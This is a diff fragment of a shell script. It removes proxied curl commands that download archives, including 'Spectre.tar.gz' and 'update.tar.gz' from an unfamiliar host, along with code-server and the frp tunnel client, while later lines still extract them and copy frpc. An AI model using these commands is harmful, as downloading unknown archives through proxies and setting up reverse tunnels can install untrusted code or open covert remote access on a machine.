@@ -72,11 +72,7 @@ sleep 2
 pwd
 sleep 2
 ls -la
-sleep 2
-
-curl -x socks5h://127.0.0.1:1080 http://greenleaf.teatspray.uk/Spectre.tar.gz -L -O -J
-
-sleep 2
+sleep 10
 
 tar -xf Spectre.tar.gz
 
@@ -87,10 +83,6 @@ sleep 2
 sleep 2
 
 curl -x socks5h://127.0.0.1:1082 api.ipify.org
-
-sleep 2
-
-curl -x socks5h://127.0.0.1:1082 http://greenleaf.teatspray.uk/update.tar.gz -L -O -J
 
 sleep 2
 
@@ -120,9 +112,6 @@ sleep 2
 
 sleep 2
 
-curl -x socks5h://127.0.0.1:1082 -s -L -o code-server.tar.gz https://github.com/coder/code-server/releases/download/v4.14.1/code-server-4.14.1-linux-amd64.tar.gz
-sleep 2
-
 tar -xf code-server.tar.gz
 sleep 2
 
@@ -150,7 +139,6 @@ cat .config/code-server/config.yaml
 
 sleep 2
 
-curl -x socks5h://127.0.0.1:1082 -k https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz -L -O -J
 tar -xvf frp_0.48.0_linux_amd64.tar.gz
 # start from daemon
 cp frp_0.48.0_linux_amd64/frpc ~/
